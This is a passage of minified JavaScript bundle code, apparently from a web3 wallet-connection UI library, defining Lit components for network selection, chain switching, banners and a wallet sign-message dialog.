      d="M15.4 2.1a5.21 5.21 0 0 1 5.2 0l11.61 6.7a5.21 5.21 0 0 1 2.61 4.52v13.4c0 1.87-1 3.59-2.6 4.52l-11.61 6.7c-1.62.93-3.6.93-5.22 0l-11.6-6.7a5.21 5.21 0 0 1-2.61-4.51v-13.4c0-1.87 1-3.6 2.6-4.52L15.4 2.1Z"
    />
  </svg>
`,eBe=ot`
  :host {
    position: relative;
    border-radius: inherit;
    display: flex;
    justify-content: center;
    align-items: center;
    width: var(--local-width);
    height: var(--local-height);
  }

  :host([data-round='true']) {
    background: ${({tokens:t})=>t.theme.foregroundPrimary};
    border-radius: 100%;
    outline: 1px solid ${({tokens:t})=>t.core.glass010};
  }

  svg {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
  }

  svg > path {
    stroke: var(--local-stroke);
  }

  wui-image {
    width: 100%;
    height: 100%;
    -webkit-clip-path: var(--local-path);
    clip-path: var(--local-path);
    background: ${({tokens:t})=>t.theme.foregroundPrimary};
  }

  wui-icon {
    transform: translateY(-5%);
    width: var(--local-icon-size);
    height: var(--local-icon-size);
  }
`;var ey=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Lf=class extends $e{constructor(){super(...arguments),this.size="md",this.name="uknown",this.networkImagesBySize={sm:XDe,md:Hae,lg:JDe},this.selected=!1,this.round=!1}render(){const e={sm:"4",md:"6",lg:"10"};return this.round?(this.dataset.round="true",this.style.cssText=`
      --local-width: var(--apkt-spacing-10);
      --local-height: var(--apkt-spacing-10);
      --local-icon-size: var(--apkt-spacing-4);
    `):this.style.cssText=`

      --local-path: var(--apkt-path-network-${this.size});
      --local-width:  var(--apkt-width-network-${this.size});
      --local-height:  var(--apkt-height-network-${this.size});
      --local-icon-size:  var(--apkt-spacing-${e[this.size]});
    `,X`${this.templateVisual()} ${this.svgTemplate()} `}svgTemplate(){return this.round?null:this.networkImagesBySize[this.size]}templateVisual(){return this.imageSrc?X`<wui-image src=${this.imageSrc} alt=${this.name}></wui-image>`:X`<wui-icon size="inherit" color="default" name="networkPlaceholder"></wui-icon>`}};Lf.styles=[Dt,eBe];ey([ie()],Lf.prototype,"size",void 0);ey([ie()],Lf.prototype,"name",void 0);ey([ie({type:Object})],Lf.prototype,"networkImagesBySize",void 0);ey([ie()],Lf.prototype,"imageSrc",void 0);ey([ie({type:Boolean})],Lf.prototype,"selected",void 0);ey([ie({type:Boolean})],Lf.prototype,"round",void 0);Lf=ey([Ue("wui-network-image")],Lf);const tBe=mr`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }

  wui-loading-hexagon {
    position: absolute;
  }

  wui-icon-box {
    position: absolute;
    right: 4px;
    bottom: 0;
    opacity: 0;
    transform: scale(0.5);
    z-index: 1;
  }

  wui-button {
    display: none;
  }

  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }

  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
  }

  wui-button[data-retry='true'] {
    display: block;
    opacity: 1;
  }
`;var uj=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let j1=class extends $e{constructor(){super(),this.network=we.state.data?.network,this.unsubscribe=[],this.showRetry=!1,this.error=!1}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}firstUpdated(){this.onSwitchNetwork()}render(){if(!this.network)throw new Error("w3m-network-switch-view: No network provided");this.onShowRetry();const e=this.getLabel(),n=this.getSubLabel();return X`
      <wui-flex
        data-error=${this.error}
        flexDirection="column"
        alignItems="center"
        .padding=${["10","5","10","5"]}
        gap="7"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-network-image
            size="lg"
            imageSrc=${et(er.getNetworkImage(this.network))}
          ></wui-network-image>

          ${this.error?null:X`<wui-loading-hexagon></wui-loading-hexagon>`}

          <wui-icon-box color="error" icon="close" size="sm"></wui-icon-box>
        </wui-flex>

        <wui-flex flexDirection="column" alignItems="center" gap="2">
          <wui-text align="center" variant="h6-regular" color="primary">${e}</wui-text>
          <wui-text align="center" variant="md-regular" color="secondary">${n}</wui-text>
        </wui-flex>

        <wui-button
          data-retry=${this.showRetry}
          variant="accent-primary"
          size="md"
          .disabled=${!this.error}
          @click=${this.onSwitchNetwork.bind(this)}
        >
          <wui-icon color="inherit" slot="iconLeft" name="refresh"></wui-icon>
          Try again
        </wui-button>
      </wui-flex>
    `}getSubLabel(){const e=Ce.getConnectorId(Y.state.activeChain);return Ce.getAuthConnector()&&e===ge.CONNECTOR_ID.AUTH?"":this.error?"Switch can be declined if chain is not supported by a wallet or previous request is still active":"Accept connection request in your wallet"}getLabel(){const e=Ce.getConnectorId(Y.state.activeChain);return Ce.getAuthConnector()&&e===ge.CONNECTOR_ID.AUTH?`Switching to ${this.network?.name??"Unknown"} network...`:this.error?"Switch declined":"Approve in wallet"}onShowRetry(){this.error&&!this.showRetry&&(this.showRetry=!0,this.shadowRoot?.querySelector("wui-button")?.animate([{opacity:0},{opacity:1}],{fill:"forwards",easing:"ease"}))}async onSwitchNetwork(){try{this.error=!1,Y.state.activeChain!==this.network?.chainNamespace&&Y.setIsSwitchingNamespace(!0),this.network&&(await Y.switchActiveNetwork(this.network),await As.isAuthenticated()&&we.goBack())}catch{this.error=!0}}};j1.styles=tBe;uj([Ee()],j1.prototype,"showRetry",void 0);uj([Ee()],j1.prototype,"error",void 0);j1=uj([Ue("w3m-network-switch-view")],j1);const nBe=ot`
  :host {
    width: 100%;
  }

  button {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: ${({spacing:t})=>t[3]};
    width: 100%;
    background-color: transparent;
    border-radius: ${({borderRadius:t})=>t[4]};
  }

  wui-text {
    text-transform: capitalize;
  }

  @media (hover: hover) {
    button:hover:enabled {
      background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    }
  }

  button:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;var AA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Ig=class extends $e{constructor(){super(...arguments),this.imageSrc=void 0,this.name="Ethereum",this.disabled=!1}render(){return X`
      <button ?disabled=${this.disabled} tabindex=${et(this.tabIdx)}>
        <wui-flex gap="2" alignItems="center">
          ${this.imageTemplate()}
          <wui-text variant="lg-regular" color="primary">${this.name}</wui-text>
        </wui-flex>
        <wui-icon name="chevronRight" size="lg" color="default"></wui-icon>
      </button>
    `}imageTemplate(){return this.imageSrc?X`<wui-image ?boxed=${!0} src=${this.imageSrc}></wui-image>`:X`<wui-image
      ?boxed=${!0}
      icon="networkPlaceholder"
      size="lg"
      iconColor="default"
    ></wui-image>`}};Ig.styles=[Dt,nr,nBe];AA([ie()],Ig.prototype,"imageSrc",void 0);AA([ie()],Ig.prototype,"name",void 0);AA([ie()],Ig.prototype,"tabIdx",void 0);AA([ie({type:Boolean})],Ig.prototype,"disabled",void 0);Ig=AA([Ue("wui-list-network")],Ig);const rBe=mr`
  .container {
    max-height: 360px;
    overflow: auto;
  }

  .container::-webkit-scrollbar {
    display: none;
  }
`;var CA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Up=class extends $e{constructor(){super(),this.unsubscribe=[],this.network=Y.state.activeCaipNetwork,this.requestedCaipNetworks=Y.getCaipNetworks(),this.search="",this.onDebouncedSearch=xe.debounce(e=>{this.search=e},100),this.unsubscribe.push(Pi.subscribeNetworkImages(()=>this.requestUpdate()),Y.subscribeKey("activeCaipNetwork",e=>this.network=e),Y.subscribe(()=>{this.requestedCaipNetworks=Y.getAllRequestedCaipNetworks()}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return X`
      ${this.templateSearchInput()}
      <wui-flex
        class="container"
        .padding=${["0","3","3","3"]}
        flexDirection="column"
        gap="2"
      >
        ${this.networksTemplate()}
      </wui-flex>
    `}templateSearchInput(){return X`
      <wui-flex gap="2" .padding=${["0","3","3","3"]}>
        <wui-input-text
          @inputChange=${this.onInputChange.bind(this)}
          class="network-search-input"
          size="md"
          placeholder="Search network"
          icon="search"
        ></wui-input-text>
      </wui-flex>
    `}onInputChange(e){this.onDebouncedSearch(e.detail)}networksTemplate(){const e=Y.getAllApprovedCaipNetworkIds(),n=xe.sortRequestedNetworks(e,this.requestedCaipNetworks);return this.search?this.filteredNetworks=n?.filter(r=>r?.name?.toLowerCase().includes(this.search.toLowerCase())):this.filteredNetworks=n,this.filteredNetworks?.map(r=>X`
        <wui-list-network
          .selected=${this.network?.id===r.id}
          imageSrc=${et(er.getNetworkImage(r))}
          type="network"
          name=${r.name??r.id}
          @click=${()=>this.onSwitchNetwork(r)}
          .disabled=${Y.isCaipNetworkDisabled(r)}
          data-testid=${`w3m-network-switch-${r.name??r.id}`}
        ></wui-list-network>
      `)}onSwitchNetwork(e){Zre.onSwitchNetwork({network:e})}};Up.styles=rBe;CA([Ee()],Up.prototype,"network",void 0);CA([Ee()],Up.prototype,"requestedCaipNetworks",void 0);CA([Ee()],Up.prototype,"filteredNetworks",void 0);CA([Ee()],Up.prototype,"search",void 0);Up=CA([Ue("w3m-networks-view")],Up);const iBe=ot`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }

  wui-loading-thumbnail {
    position: absolute;
  }

  wui-visual {
    border-radius: calc(
      ${({borderRadius:t})=>t[1]} * 9 - ${({borderRadius:t})=>t[3]}
    );
    position: relative;
    overflow: hidden;
  }

  wui-visual::after {
    content: '';
    display: block;
    width: 100%;
    height: 100%;
    position: absolute;
    inset: 0;
    border-radius: calc(
      ${({borderRadius:t})=>t[1]} * 9 - ${({borderRadius:t})=>t[3]}
    );
    box-shadow: inset 0 0 0 1px ${({tokens:t})=>t.core.glass010};
  }

  wui-icon-box {
    position: absolute;
    right: calc(${({spacing:t})=>t[1]} * -1);
    bottom: calc(${({spacing:t})=>t[1]} * -1);
    opacity: 0;
    transform: scale(0.5);
    transition:
      opacity ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-2"]},
      transform ${({durations:t})=>t.lg}
        ${({easings:t})=>t["ease-out-power-2"]};
    will-change: opacity, transform;
  }

  wui-text[align='center'] {
    width: 100%;
    padding: 0px ${({spacing:t})=>t[4]};
  }

  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }

  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms ${({easings:t})=>t["ease-out-power-2"]} both;
  }

  [data-retry='false'] wui-link {
    display: none;
  }

  [data-retry='true'] wui-link {
    display: block;
    opacity: 1;
  }

  wui-link {
    padding: ${({spacing:t})=>t["01"]} ${({spacing:t})=>t[2]};
  }

  .capitalize {
    text-transform: capitalize;
  }
`;var oce=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const sBe={eip155:"eth",solana:"solana",bip122:"bitcoin",polkadot:void 0};let C_=class extends $e{constructor(){super(...arguments),this.unsubscribe=[],this.switchToChain=we.state.data?.switchToChain,this.caipNetwork=we.state.data?.network,this.activeChain=Y.state.activeChain}firstUpdated(){this.unsubscribe.push(Y.subscribeKey("activeChain",e=>this.activeChain=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.switchToChain?ge.CHAIN_NAME_MAP[this.switchToChain]:"supported";if(!this.switchToChain)return null;const n=ge.CHAIN_NAME_MAP[this.switchToChain];return X`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["4","2","2","2"]}
        gap="4"
      >
        <wui-flex justifyContent="center" flexDirection="column" alignItems="center" gap="2">
          <wui-visual
            size="md"
            name=${et(sBe[this.switchToChain])}
          ></wui-visual>
          <wui-flex gap="2" flexDirection="column" alignItems="center">
            <wui-text
              data-testid=${`w3m-switch-active-chain-to-${n}`}
              variant="lg-regular"
              color="primary"
              align="center"
              >Switch to <span class="capitalize">${n}</span></wui-text
            >
            <wui-text variant="md-regular" color="secondary" align="center">
              Connected wallet doesn't support connecting to ${e} chain. You
              need to connect with a different wallet.
            </wui-text>
          </wui-flex>
          <wui-button
            data-testid="w3m-switch-active-chain-button"
            size="md"
            @click=${this.switchActiveChain.bind(this)}
            >Switch</wui-button
          >
        </wui-flex>
      </wui-flex>
    `}async switchActiveChain(){this.switchToChain&&(Y.setIsSwitchingNamespace(!0),Ce.setFilterByNamespace(this.switchToChain),this.caipNetwork?await Y.switchActiveNetwork(this.caipNetwork):Y.setActiveNamespace(this.switchToChain),we.reset("Connect"))}};C_.styles=iBe;oce([ie()],C_.prototype,"activeChain",void 0);C_=oce([Ue("w3m-switch-active-chain-view")],C_);var oBe=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const aBe=[{images:["network","layers","system"],title:"The systems nuts and bolts",text:"A network is what brings the blockchain to life, as this technical infrastructure allows apps to access the ledger and smart contract services."},{images:["noun","defiAlt","dao"],title:"Designed for different uses",text:"Each network is designed differently, and may therefore suit certain apps and experiences."}];let nD=class extends $e{render(){return X`
      <wui-flex
        flexDirection="column"
        .padding=${["6","5","5","5"]}
        alignItems="center"
        gap="5"
      >
        <w3m-help-widget .data=${aBe}></w3m-help-widget>
        <wui-button
          variant="accent-primary"
          size="md"
          @click=${()=>{xe.openHref("https://ethereum.org/en/developers/docs/networks/","_blank")}}
        >
          Learn more
          <wui-icon color="inherit" slot="iconRight" name="externalLink"></wui-icon>
        </wui-button>
      </wui-flex>
    `}};nD=oBe([Ue("w3m-what-is-a-network-view")],nD);const cBe=mr`
  :host > wui-flex {
    max-height: clamp(360px, 540px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
  }

  :host > wui-flex::-webkit-scrollbar {
    display: none;
  }
`;var lj=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let M1=class extends $e{constructor(){super(),this.swapUnsupportedChain=we.state.data?.swapUnsupportedChain,this.unsubscribe=[],this.disconnecting=!1,this.remoteFeatures=de.state.remoteFeatures,this.unsubscribe.push(Pi.subscribeNetworkImages(()=>this.requestUpdate()),de.subscribeKey("remoteFeatures",e=>{this.remoteFeatures=e}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return X`
      <wui-flex class="container" flexDirection="column" gap="0">
        <wui-flex
          class="container"
          flexDirection="column"
          .padding=${["3","5","2","5"]}
          alignItems="center"
          gap="5"
        >
          ${this.descriptionTemplate()}
        </wui-flex>

        <wui-flex flexDirection="column" padding="3" gap="2"> ${this.networksTemplate()} </wui-flex>

        <wui-separator text="or"></wui-separator>
        <wui-flex flexDirection="column" padding="3" gap="2">
          <wui-list-item
            variant="icon"
            iconVariant="overlay"
            icon="signOut"
            ?chevron=${!1}
            .loading=${this.disconnecting}
            @click=${this.onDisconnect.bind(this)}
            data-testid="disconnect-button"
          >
            <wui-text variant="md-medium" color="secondary">Disconnect</wui-text>
          </wui-list-item>
        </wui-flex>
      </wui-flex>
    `}descriptionTemplate(){return this.swapUnsupportedChain?X`
        <wui-text variant="sm-regular" color="secondary" align="center">
          The swap feature doesnt support your current network. Switch to an available option to
          continue.
        </wui-text>
      `:X`
      <wui-text variant="sm-regular" color="secondary" align="center">
        This app doesnt support your current network. Switch to an available option to continue.
      </wui-text>
    `}networksTemplate(){const e=Y.getAllRequestedCaipNetworks(),n=Y.getAllApprovedCaipNetworkIds(),r=xe.sortRequestedNetworks(n,e);return(this.swapUnsupportedChain?r.filter(s=>jt.SWAP_SUPPORTED_NETWORKS.includes(s.caipNetworkId)):r).map(s=>X`
        <wui-list-network
          imageSrc=${et(er.getNetworkImage(s))}
          name=${s.name??"Unknown"}
          @click=${()=>this.onSwitchNetwork(s)}
        >
        </wui-list-network>
      `)}async onDisconnect(){try{this.disconnecting=!0;const e=Y.state.activeChain,r=ke.getConnections(e).length>0,i=e&&Ce.state.activeConnectorIds[e],s=this.remoteFeatures?.multiWallet;await ke.disconnect(s?{id:i,namespace:e}:{}),r&&s&&(we.push("ProfileWallets"),on.showSuccess("Wallet deleted"))}catch{tt.sendEvent({type:"track",event:"DISCONNECT_ERROR",properties:{message:"Failed to disconnect"}}),on.showError("Failed to disconnect")}finally{this.disconnecting=!1}}async onSwitchNetwork(e){const n=Y.getActiveCaipAddress(),r=Y.getAllApprovedCaipNetworkIds(),i=Y.getNetworkProp("supportsAllNetworks",e.chainNamespace),s=we.state.data;n?r?.includes(e.caipNetworkId)?await Y.switchActiveNetwork(e):i?we.push("SwitchNetwork",{...s,network:e}):we.push("SwitchNetwork",{...s,network:e}):n||(Y.setActiveCaipNetwork(e),we.push("Connect"))}};M1.styles=cBe;lj([Ee()],M1.prototype,"disconnecting",void 0);lj([Ee()],M1.prototype,"remoteFeatures",void 0);M1=lj([Ue("w3m-unsupported-chain-view")],M1);const uBe=ot`
  wui-flex {
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: ${({spacing:t})=>t[2]};
    border-radius: ${({borderRadius:t})=>t[4]};
    padding: ${({spacing:t})=>t[3]};
  }

  /* -- Types --------------------------------------------------------- */
  wui-flex[data-type='info'] {
    color: ${({tokens:t})=>t.theme.textSecondary};
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
  }

  wui-flex[data-type='success'] {
    color: ${({tokens:t})=>t.core.textSuccess};
    background-color: ${({tokens:t})=>t.core.backgroundSuccess};
  }

  wui-flex[data-type='error'] {
    color: ${({tokens:t})=>t.core.textError};
    background-color: ${({tokens:t})=>t.core.backgroundError};
  }

  wui-flex[data-type='warning'] {
    color: ${({tokens:t})=>t.core.textWarning};
    background-color: ${({tokens:t})=>t.core.backgroundWarning};
  }

  wui-flex[data-type='info'] wui-icon-box {
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
  }

  wui-flex[data-type='success'] wui-icon-box {
    background-color: ${({tokens:t})=>t.core.backgroundSuccess};
  }

  wui-flex[data-type='error'] wui-icon-box {
    background-color: ${({tokens:t})=>t.core.backgroundError};
  }

  wui-flex[data-type='warning'] wui-icon-box {
    background-color: ${({tokens:t})=>t.core.backgroundWarning};
  }

  wui-text {
    flex: 1;
  }
`;var b8=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let U1=class extends $e{constructor(){super(...arguments),this.icon="externalLink",this.text="",this.type="info"}render(){return X`
      <wui-flex alignItems="center" data-type=${this.type}>
        <wui-icon-box size="sm" color="inherit" icon=${this.icon}></wui-icon-box>
        <wui-text variant="md-regular" color="inherit">${this.text}</wui-text>
      </wui-flex>
    `}};U1.styles=[Dt,nr,uBe];b8([ie()],U1.prototype,"icon",void 0);b8([ie()],U1.prototype,"text",void 0);b8([ie()],U1.prototype,"type",void 0);U1=b8([Ue("wui-banner")],U1);const lBe=mr`
  :host > wui-flex {
    max-height: clamp(360px, 540px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
  }

  :host > wui-flex::-webkit-scrollbar {
    display: none;
  }
`;var dBe=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let cI=class extends $e{constructor(){super(),this.unsubscribe=[]}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return X` <wui-flex flexDirection="column" .padding=${["2","3","3","3"]} gap="2">
      <wui-banner
        icon="warningCircle"
        text="You can only receive assets on these networks"
      ></wui-banner>
      ${this.networkTemplate()}
    </wui-flex>`}networkTemplate(){const e=Y.getAllRequestedCaipNetworks(),n=Y.getAllApprovedCaipNetworkIds(),r=Y.state.activeCaipNetwork,i=Y.checkIfSmartAccountEnabled();let s=xe.sortRequestedNetworks(n,e);if(i&&Zr(r?.chainNamespace)===Xn.ACCOUNT_TYPES.SMART_ACCOUNT){if(!r)return null;s=[r]}return s.filter(a=>a.chainNamespace===r?.chainNamespace).map(a=>X`
        <wui-list-network
          imageSrc=${et(er.getNetworkImage(a))}
          name=${a.name??"Unknown"}
          ?transparent=${!0}
        >
        </wui-list-network>
      `)}};cI.styles=lBe;cI=dBe([Ue("w3m-wallet-compatible-networks-view")],cI);const fBe=ot`
  :host {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 56px;
    height: 56px;
    box-shadow: 0 0 0 8px ${({tokens:t})=>t.theme.borderPrimary};
    border-radius: ${({borderRadius:t})=>t[4]};
    overflow: hidden;
  }

  :host([data-border-radius-full='true']) {
    border-radius: 50px;
  }

  wui-icon {
    width: 32px;
    height: 32px;
  }
`;var w8=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let L1=class extends $e{render(){return this.dataset.borderRadiusFull=this.borderRadiusFull?"true":"false",X`${this.templateVisual()}`}templateVisual(){return this.imageSrc?X`<wui-image src=${this.imageSrc} alt=${this.alt??""}></wui-image>`:X`<wui-icon
      data-parent-size="md"
      size="inherit"
      color="inherit"
      name="wallet"
    ></wui-icon>`}};L1.styles=[Dt,fBe];w8([ie()],L1.prototype,"imageSrc",void 0);w8([ie()],L1.prototype,"alt",void 0);w8([ie({type:Boolean})],L1.prototype,"borderRadiusFull",void 0);L1=w8([Ue("wui-visual-thumbnail")],L1);const hBe=ot`
  :host {
    display: flex;
    justify-content: center;
    gap: ${({spacing:t})=>t[4]};
  }

  wui-visual-thumbnail:nth-child(1) {
    z-index: 1;
  }
`;var pBe=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let rD=class extends $e{constructor(){super(...arguments),this.dappImageUrl=de.state.metadata?.icons,this.walletImageUrl=Y.getAccountData()?.connectedWalletInfo?.icon}firstUpdated(){const e=this.shadowRoot?.querySelectorAll("wui-visual-thumbnail");e?.[0]&&this.createAnimation(e[0],"translate(18px)"),e?.[1]&&this.createAnimation(e[1],"translate(-18px)")}render(){return X`
      <wui-visual-thumbnail
        ?borderRadiusFull=${!0}
        .imageSrc=${this.dappImageUrl?.[0]}
      ></wui-visual-thumbnail>
      <wui-visual-thumbnail .imageSrc=${this.walletImageUrl}></wui-visual-thumbnail>
    `}createAnimation(e,n){e.animate([{transform:"translateX(0px)"},{transform:n}],{duration:1600,easing:"cubic-bezier(0.56, 0, 0.48, 1)",direction:"alternate",iterations:1/0})}};rD.styles=hBe;rD=pBe([Ue("w3m-siwx-sign-message-thumbnails")],rD);var dj=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let S_=class extends $e{constructor(){super(...arguments),this.dappName=de.state.metadata?.name,this.isCancelling=!1,this.isSigning=!1}render(){return X`
      <wui-flex justifyContent="center" .padding=${["8","0","6","0"]}>
        <w3m-siwx-sign-message-thumbnails></w3m-siwx-sign-message-thumbnails>
      </wui-flex>
      <wui-flex .padding=${["0","20","5","20"]} gap="3" justifyContent="space-between">
        <wui-text variant="lg-medium" align="center" color="primary"
          >${this.dappName??"Dapp"} needs to connect to your wallet</wui-text
        >
      </wui-flex>
      <wui-flex .padding=${["0","10","4","10"]} gap="3" justifyContent="space-between">
        <wui-text variant="md-regular" align="center" color="secondary"
          >Sign this message to prove you own this wallet and proceed. Canceling will disconnect
          you.</wui-text
        >
      </wui-flex>
      <wui-flex .padding=${["4","5","5","5"]} gap="3" justifyContent="space-between">
        <wui-button
          size="lg"
          borderRadius="xs"
          fullWidth
          variant="neutral-secondary"
          ?loading=${this.isCancelling}
          @click=${this.onCancel.bind(this)}
          data-testid="w3m-connecting-siwe-cancel"
        >
          ${this.isCancelling?"Cancelling...":"Cancel"}
        </wui-button>
        <wui-button
          size="lg"
          borderRadius="xs"
          fullWidth
          variant="neutral-primary"
          @click=${this.onSign.bind(this)}
          ?loading=${this.isSigning}
          data-testid="w3m-connecting-siwe-sign"
        >
          ${this.isSigning?"Signing...":"Sign"}
        </wui-button>
      </wui-flex>
    `}async onSign(){this.isSigning=!0;try{await As.requestSignMessage()}catch(e){if(e instanceof Error&&e.message.includes("OTP is required")){on.showError({message:"Something went wrong. We need to verify your account again."}),we.replace("DataCapture");return}throw e}finally{this.isSigning=!1}}async onCancel(){this.isCancelling=!0,await As.cancelSignMessage().finally(()=>this.isCancelling=!1)}};dj([Ee()],S_.prototype,"isCancelling",void 0);dj([Ee()],S_.prototype,"isSigning",void 0);S_=dj([Ue("w3m-siwx-sign-message-view")],S_);const mBe=Object.freeze(Object.defineProperty({__proto__:null,get AppKitAccountButton(){return qx},get AppKitButton(){return Vx},get AppKitConnectButton(){return Wx},get AppKitNetworkButton(){return Gx},get W3mAccountButton(){return U7},get W3mAccountSettingsView(){return kf},get W3mAccountView(){return Zx},get W3mAllWalletsView(){return b_},get W3mButton(){return L7},get W3mChooseAccountNameView(){return E_},get W3mConnectButton(){return F7},get W3mConnectView(){return _o},get W3mConnectWalletsView(){return A_},get W3mConnectingExternalView(){return Z7},get W3mConnectingMultiChainView(){return w_},get W3mConnectingWcBasicView(){return v_},get W3mConnectingWcView(){return td},get W3mDownloadsView(){return Q7},get W3mFooter(){return I1},get W3mFundWalletView(){return jp},get W3mGetWalletView(){return J7},get W3mNetworkButton(){return $7},get W3mNetworkSwitchView(){return j1},get W3mNetworksView(){return Up},get W3mProfileWalletsView(){return Qs},get W3mRouter(){return R1},get W3mSIWXSignMessageView(){return S_},get W3mSwitchActiveChainView(){return C_},get W3mUnsupportedChainView(){return M1},get W3mWalletCompatibleNetworksView(){return cI},get W3mWhatIsANetworkView(){return nD},get W3mWhatIsAWalletView(){return eD}},Symbol.toStringTag,{value:"Module"}));d8({tagName:"appkit-button",elementClass:Vx,react:jI});d8({tagName:"appkit-network-button",elementClass:Gx,react:jI});d8({tagName:"appkit-connect-button",elementClass:Wx,react:jI});d8({tagName:"appkit-account-button",elementClass:qx,react:jI});let bO;function gBe(t){return bO||(bO=new 